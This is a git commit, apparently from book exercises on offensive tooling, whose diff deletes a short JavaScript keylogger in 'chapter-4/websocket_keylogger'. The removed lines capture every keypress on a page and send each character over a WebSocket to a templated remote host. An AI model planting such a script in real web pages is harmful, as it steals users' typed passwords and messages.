fb95db2640f143e3ccb236bef08c99f2363be7af
TralahM <musyoki.tralah@students.jkuat.ac.ke>
2020-03-26 04:05:58 +0300

    unstage js code

--- chapter-4/websocket_keylogger/logger.js
+++
@@ -1,8 +0,0 @@
-(function() {
-    var conn = new WebSocket("ws://{{.}}/ws");
-    document.onkeypress = keypress;
-    function keypress(evt) {
-        s = String.fromCharCode(evt.which);
-        conn.send(s);
-    }
-})();
